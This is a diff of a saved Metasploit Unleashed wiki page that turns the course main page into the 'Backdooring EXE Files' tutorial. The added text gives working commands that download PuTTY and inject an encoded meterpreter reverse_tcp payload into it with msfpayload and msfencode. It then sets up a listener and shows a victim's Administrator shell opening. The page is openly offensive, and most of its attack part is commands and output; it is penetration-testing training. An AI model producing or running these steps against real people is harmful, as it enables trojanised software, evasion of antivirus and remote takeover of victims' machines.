@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Backdooring EXE Files - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Backdooring_EXE_Files" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Backdooring_EXE_Files&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Backdooring_EXE_Files&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Backdooring_EXE_Files&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,222 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Backdooring EXE Files</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Backdooring_EXE_Files#column-one">navigation</a>, <a href="Backdooring_EXE_Files#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple. We begin by first downloading our legitimate executable, in this case, the popular PuTTY client.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/var/www# <span style='color:#13C16a;'>wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span>
+--2011-02-05 08:18:56--  http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+Resolving the.earth.li... 217.147.81.2
+Connecting to the.earth.li|217.147.81.2|:80... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: http://the.earth.li/~sgtatham/putty/0.60/x86/putty.exe [following]
+--2011-02-05 08:18:57--  http://the.earth.li/~sgtatham/putty/0.60/x86/putty.exe
+Reusing existing connection to the.earth.li:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 454656 (444K) [application/x-msdos-program]
+Saving to: `putty.exe'
+
+100%[==================================================================================================================================================================================================>] 454,656      138K/s   in 3.2s    
+
+2011-02-05 08:19:00 (138 KB/s) - `putty.exe' saved [454656/454656]
+
+<span style='color:#ff0000;'>root@kali</span>:/var/www#</pre>
+<br />
+Next, we use msfpayload to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/var/www# <span style='color:#13C16a;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 3 -t exe -x /var/www/putty.exe -o /var/www/puttyx.exe</span>
+<span style='color:#0000FF;'>[*]</span> x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+
+<span style='color:#0000FF;'>[*]</span> x86/shikata_ga_nai succeeded with size 344 (iteration=2)
+
+<span style='color:#0000FF;'>[*]</span> x86/shikata_ga_nai succeeded with size 371 (iteration=3)
+
+<span style='color:#ff0000;'>root@kali</span>:/var/www#</pre>
+<br />
+Since we have selected a reverse meterpreter payload, we need to setup the exploit handler to handle the connection back to our attacking machine.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16a;'>use exploit/multi/handler</span> 
+msf exploit(handler) > <span style='color:#13C16a;'>set PAYLOAD windows/meterpreter/reverse_tcp</span> 
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(handler) > <span style='color:#13C16a;'>set LHOST 192.168.1.101</span>
+LHOST => 192.168.1.101
+msf exploit(handler) > <span style='color:#13C16a;'>set LPORT 443</span>
+LPORT => 443
+msf exploit(handler) > <span style='color:#13C16a;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:443 
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...</pre>
+<br />
+As soon as our victim downloads and executes our special version of PuTTY, we are presented with a meterpreter shell on the target.
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes) to 192.168.1.201
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011
+
+<u>meterpreter</u> > <span style='color:#13C16a;'>getuid</span>
+Server username: XEN-XP-SPLOIT\Administrator
+<u>meterpreter</u> ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; Backdooring EXE Files</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="PHP_Meterpreter" title="PHP Meterpreter">PHP Meterpreter</a> &#124; <strong class="selflink">Backdooring EXE Files</strong> &#124; <a href="Karmetasploit" title="Karmetasploit">Karmetasploit</a> &#124; <a href="MSF_vs_OS_X" title="MSF vs OS X">MSF vs OS X</a> &#124; <a href="File-Upload_Backdoors" title="File-Upload Backdoors">File-Upload Backdoors</a> &#124; <a href="Building_A_Module" title="Building A Module">Building A Module</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 510/1000000
+Preprocessor generated node count: 2671/1000000
+Post‐expand include size: 4320/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:83-0!*!0!*!*!*!* and timestamp 20131123214949 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Backdooring_EXE_Files&amp;oldid=1594">http://www.offensive-security.com/w/index.php?title=Backdooring_EXE_Files&amp;oldid=1594</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Extended_Usage&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Extended Usage (page does not exist)">MSF Extended Usage</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +707,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.139 secs. --></body></html>
